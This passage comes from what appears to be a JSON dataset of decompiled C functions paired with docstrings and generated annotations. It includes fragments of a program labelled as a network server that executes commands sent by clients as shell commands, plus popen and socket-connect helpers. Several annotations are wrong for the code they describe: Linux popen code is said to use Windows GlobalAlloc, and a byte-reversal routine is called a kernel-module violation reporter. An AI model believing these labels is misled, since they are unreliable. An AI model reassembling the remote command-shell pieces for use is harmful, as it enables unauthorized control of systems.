            "v5",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "send",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "v5",
            ",",
            "0",
            ")",
            ";",
            "free",
            "(",
            "s",
            ")",
            ";",
            "}",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The __readfsqword function is used to read a quadword (8 bytes) from the specified offset in the FS segment register on x86 and x64 architectures.",
            "The `create` function likely serves to initialize or set up some data structures or resources for a program, possibly related to concurrent programming, user-level threads, or a distributed system, as indicated by the included code snippets referencing systems programming, thread management, and data structure definitions.",
            "The `strlen` function in the provided code snippets is a custom implementation for determining the length of a null-terminated string in C, with additional type definitions, macro definitions, and utility functions for string manipulation and type conversion."
        ],
        "longer_label": "The provided C code likely constitutes a network server program that listens on a specified address and port, accepts commands sent by clients, executes them as shell commands, and sends back the output until the client sends an \"exit\" command, featuring custom implementations for string manipulation and low-level system function calls."
    },
    {
        "id": 485,
        "docstring_tokens": [
            "This",
            "function",
            "takes",
            "a",
            "command",
            "as",
            "input",
            ",",
            "executes",
            "it",
            "in",
            "a",
            "shell",
            "environment",
            ",",
            "reads",
            "the",
            "output",
            "from",
            "the",
            "command",
            ",",
            "and",
            "stores",
            "it",
            "in",
            "a",
            "dynamically",
            "allocated",
            "buffer",
            "pointed",
            "to",
            "by",
            "comout",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "void",
            "*",
            "*",
            "a2",
            ")",
            "{",
            "size_t",
            "size",
            ";",
            "__int64",
            "v4",
            ";",
            "FILE",
            "*",
            "stream",
            ";",
            "size_t",
            "n",
            ";",
            "char",
            "src",
            "[",
            "264",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "stream",
            "=",
            "popen",
            "(",
            "a1",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "stream",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "size",
            "=",
            "256L",
            "L",
            ";",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "a2",
            "=",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "n",
            "=",
            "fread",
            "(",
            "src",
            ",",
            "1uL",
            "L",
            ",",
            "0x100uL",
            "L",
            ",",
            "stream",
            ")",
            ";",
            "if",
            "(",
            "!",
            "n",
            ")",
            "break",
            ";",
            "if",
            "(",
            "size",
            "<",
            "=",
            "v4",
            "+",
            "n",
            ")",
            "{",
            "size",
            "*",
            "=",
            "2L",
            "L",
            ";",
            "*",
            "a2",
            "=",
            "realloc",
            "(",
            "*",
            "a2",
            ",",
            "size",
            ")",
            ";",
            "}",
            "memmove",
            "(",
            "(",
            "char",
            "*",
            ")",
            "*",
            "a2",
            "+",
            "v4",
            ",",
            "src",
            ",",
            "n",
            ")",
            ";",
            "v4",
            "+",
            "=",
            "n",
            ";",
            "}",
            "pclose",
            "(",
            "stream",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `malloc` function appears to be redefined in the provided code snippets to allocate memory using `GlobalAlloc` with zero initialization, suggesting it is intended for dynamic memory allocation in a Windows environment, possibly for a custom memory management system or compatibility with existing codebases."
        ],
        "longer_label": "The provided code defines a function named \"shell\" which executes a shell command specified by the input string, reads the output of the command into dynamically allocated memory, and returns 0 upon successful execution, with memory allocation performed using `GlobalAlloc` for compatibility with Windows environments."
    },
    {
        "id": 486,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "socket",
            ",",
            "sets",
            "up",
            "the",
            "server",
            "address",
            "and",
            "port",
            ",",
            "connects",
            "to",
            "the",
            "server",
            ",",
            "and",
            "returns",
            "the",
            "socket",
            "file",
            "descriptor",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "uint16_t",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "fd",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "addr",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "inet_addr",
            "(",
            "a1",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "addr",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ")",
            "{",
            "printf",
            "(",
            "\"Error to Connect\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit quadword from the FS segment register on x86 architectures, primarily for low-level system programming tasks such as accessing thread information or processor-specific control registers.",
            "The function `htons` is used to convert a 16-bit integer from host byte order to network byte order (big-endian), commonly utilized in network programming for ensuring consistency in data representation across different architectures.",
            "The function `printf` is being redefined and analyzed in a C codebase likely for the purpose of customizing formatting behaviors, such as handling special cases like infinity and NaN, and possibly extending or overriding default printf behavior, including for an RPN calculator application."
        ],
        "longer_label": "The provided code defines a function `create_socket` which creates a socket, sets up the address structure with given IP address and port, attempts to connect to the specified address, and returns the socket file descriptor, handling potential errors with a message and exit if connection fails, while utilizing low-level system functions for thread information and network byte order conversion."
    },
    {
        "id": 487,
        "docstring_tokens": [
            "This",
            "code",
            "adds",
            "a",
            "new",
            "entry",
            "to",
            "a",
            "list",
            "only",
            "if",
            "the",
            "entry",
            "does",
            "not",
            "already",
            "exist",
            "in",
            "the",
            "list",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "_QWORD",
            "*",
            "v3",
            ";",
            "if",
            "(",
            "cli_txt_list_get",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "(",
            "_QWORD",
            "*",
            ")",
            "os_zalloc",
            "(",
            "24L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v3",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v3",
            "[",
            "2",
            "]",
            "=",
            "os_strdup",
            "(",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "[",
            "2",
            "]",
            ")",
            "{",
            "dl_list_add",
            "(",
            "(",
            "__int64",
            ")",
            "a1",
            ",",
            "v3",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "os_free",
            "(",
            "v3",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `list_add` function is used to add an item to the back of a linked list, copying the provided data into the list structure, and handling memory allocation accordingly.",
            "The `_txt_list_get` function is likely intended to retrieve a `cli_txt_entry` structure from a doubly linked list (`txt_list`) based on a specified text (`txt`).",
            "The function \"os_zalloc\" allocates and zeros out memory, returning a pointer to the allocated and zeroed memory, or NULL on failure, and it's likely part of a memory allocation library with debug capabilities for embedded systems.",
            "The function `os_strdup` duplicates a string by allocating memory for a new string and copying the contents of the source string into it, returning the allocated buffer, or NULL on failure, with the caller responsible for freeing the memory using `os_free()`.",
            "The `dl_list_add` function is used to add a new item to a doubly linked list, maintaining the list's integrity by correctly updating the pointers of the neighboring nodes.",
            "The function `os_free` is part of a system memory management library, likely intended for resource deallocation, particularly for freeing memory allocated by functions like `os_malloc`, `os_calloc`, `os_realloc`, and possibly `os_strdup`, ensuring proper memory management in a C-based software system."
        ],
        "longer_label": "The `cli_txt_list_add` function adds a new entry to a linked list (`txt_list`), allocating memory for the entry and duplicating the provided text (`a2`) while handling memory allocation failures appropriately, with the assumption that `cli_txt_list_get` retrieves an entry from the list based on a specified text."
    },
    {
        "id": 488,
        "docstring_tokens": [
            "This",
            "code",
            "takes",
            "a",
            "string",
            "containing",
            "a",
            "MAC",
            "address",
            ",",
            "converts",
            "it",
            "to",
            "binary",
            "form",
            ",",
            "formats",
            "it",
            "as",
            "a",
            "string",
            ",",
            "and",
            "adds",
            "it",
            "to",
            "a",
            "linked",
            "list",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "char",
            "v3",
            "[",
            "6",
            "]",
            ";",
            "char",
            "v4",
            "[",
            "24",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "hwaddr_aton",
            "(",
            "a2",
            ",",
            "v3",
            ")",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "os_snprintf",
            "(",
            "v4",
            ",",
            "18L",
            "L",
            ",",
            "\"%02x:%02x:%02x:%02x:%02x:%02x\"",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "[",
            "0",
            "]",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "[",
            "1",
            "]",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "[",
            "2",
            "]",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "[",
            "3",
            "]",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "[",
            "4",
            "]",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v3",
            "[",
            "5",
            "]",
            ")",
            ";",
            "return",
            "cli_txt_list_add",
            "(",
            "a1",
            ",",
            "(",
            "__int64",
            ")",
            "v4",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword (8 bytes) from the segment register FS at a specified offset, often utilized in low-level system programming for accessing thread-local storage (TLS) on x86 architectures.",
            "The function \"hwaddr\" likely retrieves hardware addresses (MAC addresses) associated with network interfaces, as indicated by the structures defining interface and hardware address information, facilitating network communication in ARP (Address Resolution Protocol) operations.",
            "The `os_snprintf` function is designed to print formatted data into a memory buffer with a specified maximum length, similar to `snprintf`, with the additional feature of handling operating system-specific differences, particularly for Windows platforms.",
            "",
            "The `_txt_list_add` function is likely used to add elements to a text list, such as station addresses or BSS identifiers, by parsing input strings and appending them to the list while handling specific events or conditions within a networking or communication context."
        ],
        "longer_label": "The given code likely adds a hardware address (MAC address) converted to a string to a text list, with `hwaddr_aton` converting the address, `os_snprintf` formatting it, and `cli_txt_list_add` adding it to the list."
    },
    {
        "id": 489,
        "docstring_tokens": [
            "This",
            "function",
            "returns",
            "the",
            "number",
            "of",
            "arguments",
            "in",
            "a",
            "command",
            "string",
            "up",
            "to",
            "a",
            "specified",
            "position",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "int",
            "i",
            ";",
            "v3",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "a2",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "i",
            "+",
            "a1",
            ")",
            "!",
            "=",
            "32",
            ")",
            "{",
            "+",
            "+",
            "v3",
            ";",
            "while",
            "(",
            "i",
            "<",
            "=",
            "a2",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "i",
            "+",
            "a1",
            ")",
            "!",
            "=",
            "32",
            ")",
            "+",
            "+",
            "i",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v3",
            ">",
            "0",
            ")",
            "-",
            "-",
            "v3",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `get_cmd_arg_num` which counts the number of command-line arguments passed to it, given a pointer to the start of the command-line string (`a1`) and the length of the string (`a2`), with the assumption that arguments are separated by spaces, and it returns the count of arguments."
    },
    {
        "id": 490,
        "docstring_tokens": [
            "This",
            "code",
            "writes",
            "a",
            "command",
            "and",
            "its",
            "arguments",
            "to",
            "a",
            "buffer",
            ",",
            "checking",
            "for",
            "buffer",
            "overflow",
            ",",
            "and",
            "returns",
            "an",
            "error",
            "if",
            "the",
            "command",
            "is",
            "too",
            "long",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "__int64",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ",",
            "int",
            "a4",
            ",",
            "__int64",
            "a5",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "v12",
            "=",
            "a1",
            "+",
            "a2",
            ";",
            "v9",
            "=",
            "os_snprintf",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "\"%s\"",
            ",",
            "a3",
            ")",
            ";",
            "if",
            "(",
            "os_snprintf_error",
            "(",
            "a2",
            ",",
            "v9",
            ")",
            ")",
            "{",
            "LABEL_7",
            ":",
            "puts",
            "(",
            "\"Too long command\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "v11",
            "=",
            "v9",
            "+",
            "a1",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "a4",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v10",
            "=",
            "os_snprintf",
            "(",
            "v11",
            ",",
            "v12",
            "-",
            "v11",
            ",",
            "\" %s\"",
            ",",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "i",
            "+",
            "a5",
            ")",
            ")",
            ";",
            "if",
            "(",
            "os_snprintf_error",
            "(",
            "v12",
            "-",
            "v11",
            ",",
            "v10",
            ")",
            ")",
            "goto",
            "LABEL_7",
            ";",
            "v11",
            "+",
            "=",
            "v10",
            ";",
            "}",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "-",
            "1",
            "+",
            "a1",
            ")",
            "=",
            "0",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The _snprintf_error function is used to handle potential errors that may occur during string formatting operations using os_snprintf, ensuring proper error checking and handling to prevent buffer overflows or data corruption.",
            "The function `os_snprintf` is a platform-independent wrapper for the standard `snprintf` function, allowing formatted output to a character buffer with specified length, commonly used in C programming for safer string formatting to prevent buffer overflow vulnerabilities."
        ],
        "longer_label": "The code defines a function `write_cmd` which formats a command string with specified arguments, utilizing `os_snprintf` for safer string formatting and error handling to prevent buffer overflows or data corruption."
    },
    {
        "id": 491,
        "docstring_tokens": [
            "The",
            "code",
            "reverses",
            "the",
            "order",
            "of",
            "bytes",
            "in",
            "a",
            "given",
            "memory",
            "block",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "void",
            "*",
            "ptr",
            ",",
            "size_t",
            "n",
            ")",
            "{",
            "uint8_t",
            "*",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "uint8_t",
            "*",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "uint8_t",
            "swap",
            ";",
            "size_t",
            "i",
            ";",
            "size_t",
            "half",
            ";",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "half",
            "=",
            "n",
            ">",
            ">",
            "1",
            ";",
            "while",
            "(",
            "i",
            "<",
            "half",
            ")",
            "{",
            "v2",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "ptr",
            "+",
            "i",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            "+",
            "i",
            ")",
            ";",
            "}",
            "swap",
            "=",
            "*",
            "v2",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "i",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "n",
            "-",
            "i",
            "-",
            "1",
            "+",
            "(",
            "_BYTE",
            ")",
            "ptr",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v4",
            ")",
            "_asan_report_load1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "v3",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "_asan_report_store1",
            "(",
            "v3",
            ",",
            "v5",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v3",
            "=",
            "v5",
            ";",
            "v6",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v6",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "n",
            "-",
            "i",
            "-",
            "1",
            "+",
            "(",
            "_BYTE",
            ")",
            "ptr",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v7",
            ")",
            "{",
            "LOBYTE",
            "(",
            "v5",
            ")",
            "=",
            "v7",
            "!",
            "=",
            "0",
            ";",
            "_asan_report_store1",
            "(",
            "(",
            "char",
            "*",
            ")",
            "ptr",
            "+",
            "n",
            "-",
            "i",
            "-",
            "1",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "*",
            "v6",
            "=",
            "swap",
            ";",
            "+",
            "+",
            "i",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `report_load` appears to be a part of a kernel module, designed to report load or access violations in the kernel, likely for security or debugging purposes, with different implementations for handling memory access violations and reporting unauthorized file accesses.",
            "The \"report\" function is used to generate and print out various kinds of reports or statistics related to the memory management and garbage collection operations within the given objspace."
        ],
        "longer_label": "The provided code is a memory manipulation function with annotations suggesting it incorporates load and store violation reporting mechanisms within a kernel module, possibly for security or debugging purposes, and appears to involve memory management and garbage collection operations."
    },
    {
        "id": 492,
        "docstring_tokens": [
            "This",
            "code",
            "tokenizes",
            "a",
            "command",
            "string",
            "into",
            "separate",
            "arguments",
            "stored",
            "in",
            "an",
            "array",
            ",",
            "accounting",
            "for",
            "spaces",
            "and",
            "quoted",
            "arguments",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "_BYTE",
            "*",
            "v2",
            ";",
            "unsigned",
            "int",
            "v4",
            ";",
            "__int64",
            "v6",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "32",
            ")",
            "+",
            "+",
            "a1",
            ";",
            "if",
            "(",
            "!",
            "*",
            "a1",
            ")",
            "break",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "8L",
            "L",
            "*",
            "(",
            "int",
            ")",
            "v4",
            "+",
            "+",
            ")",
            "=",
            "a1",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "10",
            ")",
            "break",
            ";",
            "if",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "34",
            ")",
            "{",
            "v6",
            "=",
            "os_strrchr",
            "(",
            "a1",
            ",",
            "34L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v6",
            ")",
            "a1",
            "=",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v6",
            "+",
            "1",
            ")",
            ";",
            "}",
            "while",
            "(",
            "*",
            "a1",
            "&",
            "&",
            "*",
            "a1",
            "!",
            "=",
            "32",
            ")",
            "+",
            "+",
            "a1",
            ";",
            "if",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "32",
            ")",
            "{",
            "v2",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "*",
            "v2",
            "=",
            "0",
            ";",
            "}",
            "}",
            "return",
            "v4",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `os_strrchr` is designed to locate the last occurrence of a specified character within a given string, behaving similarly to the standard C library function `strrchr()`, but potentially providing additional functionalities or modifications tailored to the specific needs of the operating system or framework it's implemented for."
        ],
        "longer_label": "The provided code is a function called `tokenize_cmd` which parses a command string by tokenizing it based on spaces, with additional handling for quoted substrings and potentially utilizing a custom `os_strrchr` function for locating the last occurrence of a specified character within the string."
    },
    {
        "id": 493,
        "docstring_tokens": [
            "The",
            "function",
            "hex2num",
            "converts",
            "a",
            "hexadecimal",
            "character",
            "to",
            "its",
            "corresponding",
            "integer",
            "value",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            ">",
            "47",
            "&",
            "&",
            "a1",
            "<",
            "=",
            "57",
            ")",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a1",
            "-",
            "48",
            ")",
            ";",
            "if",
            "(",
            "a1",
            ">",
            "96",
            "&",
            "&",
            "a1",
            "<",
            "=",
            "102",
            ")",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a1",
            "-",
            "87",
            ")",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "64",
            "|",
            "|",
            "a1",
            ">",
            "70",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a1",
            "-",
            "55",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The given code is a function named \"hex2num\" which takes a single character as input and returns its corresponding hexadecimal value as a 64-bit integer, returning 0xFFFFFFFFFFFFFFFF if the input character is not a valid hexadecimal digit."
    },
    {
        "id": 494,
        "docstring_tokens": [
            "The",
            "function",
            "hex2byte",
            "converts",
            "a",
            "hexadecimal",
            "string",
            "to",
            "a",
            "byte",
            "value",
            "by",
            "converting",
            "each",
            "pair",
            "of",
            "characters",
            "to",
            "a",
            "numerical",
            "value",
            "and",
            "combining",
            "them",
            "into",
            "a",
            "single",
            "byte",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "v2",
            "=",
            "hex2num",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "v2",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v3",
            "=",
            "hex2num",
            "(",
            "a1",
            "[",
            "1",
            "]",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ">",
            "=",
            "0",
            ")",
            "return",
            "v3",
            "|",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "16",
            "*",
            "v2",
            ")",
            ";",
            "else",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function called hex2byte, which takes a pointer to a character array as input, converts the first two characters of the array from hexadecimal to a byte value, and returns the resulting byte value, or 0xFFFFFFFF if any of the characters are not valid hexadecimal digits."
    },
    {
        "id": 495,
        "docstring_tokens": [
            "This",
            "code",
            "parses",
            "a",
            "text",
            "representation",
            "of",
            "a",
            "hardware",
            "address",
            ",",
            "extracts",
            "the",
            "address",
            "and",
            "optional",
            "mask",
            ",",
            "and",
            "returns",
            "-1",
            "if",
            "the",
            "parsing",
            "fails",
            "or",
            "0",
            "otherwise",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "char",
            "a4",
            ")",
            "{",
            "char",
            "*",
            "v7",
            ";",
            "v7",
            "=",
            "hwaddr_parse",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v7",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "*",
            "v7",
            "&",
            "&",
            "(",
            "(",
            "*",
            "_ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "(",
            "unsigned",
            "__int8",
            ")",
            "*",
            "v7",
            "]",
            "&",
            "0x2000",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "!",
            "a4",
            "|",
            "|",
            "*",
            "v7",
            "!",
            "=",
            "47",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "!",
            "hwaddr_parse",
            "(",
            "v7",
            "+",
            "1",
            ",",
            "a3",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "os_memset",
            "(",
            "a3",
            ",",
            "255L",
            "L",
            ",",
            "6L",
            "L",
            ")",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `hwaddr` function likely retrieves hardware (MAC) addresses associated with network interfaces given their interface index, hardware type, and address length, as well as storing interface information in a linked list structure.",
            "The \"parse\" function appears to be part of a program, possibly a text editor like vi, responsible for parsing and interpreting input, likely related to syntax analysis and command execution within the editor.",
            "The `os_memset` function is used to fill a memory area specified by the pointer `s` with a constant byte value `c`, for a length of `n` bytes, and returns a pointer to the start of the filled memory area."
        ],
        "longer_label": "The code is a function that parses a given string representing a hardware (MAC) address and, depending on certain conditions, either stores the parsed address in a specified memory location or fills the memory location with 255 if the address parsing fails or the address is not in a valid format."
    },
    {
        "id": 496,
